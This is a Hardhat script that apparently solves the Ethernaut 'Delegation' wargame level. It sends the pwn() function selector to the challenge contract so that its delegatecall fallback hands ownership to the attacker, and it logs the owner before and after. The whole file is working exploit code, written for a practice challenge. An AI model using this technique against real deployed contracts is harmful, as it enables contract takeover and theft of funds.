import { fail } from "assert";
import { Interface } from "ethers/lib/utils";
import { ethers } from "hardhat";
import { BLOCK_EXPLORER_URL, developmentNetworks } from "../hardhat.config";

async function delegationExploit() {
  const delegationAddress = process.env.DELEGATION_ADDRESS || fail("DELEGATE_ADDRESS Not Found In .env");
  const [attacker] = await ethers.getSigners();
  const delegation = await ethers.getContractAt("Delegation", delegationAddress);

  const abi = ["function pwn() public"];
  const iface = new Interface(abi);
  const selector = iface.getSighash("pwn()");

  console.log("-------------------------------------------------- Attacker : ", attacker.address);
  console.log("-------------------------------------------------- Owner Before : ", await delegation.owner());

  const tx = await attacker.sendTransaction({
    to: delegationAddress,
    data: selector,
  });
  if (ethers.provider.network.name in developmentNetworks)
    console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);

  await tx.wait(1);
  console.log("-------------------------------------------------- Owner After : ", await delegation.owner());
  console.log(`SUCCESS!!! Submit the instance.`);
}

delegationExploit().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
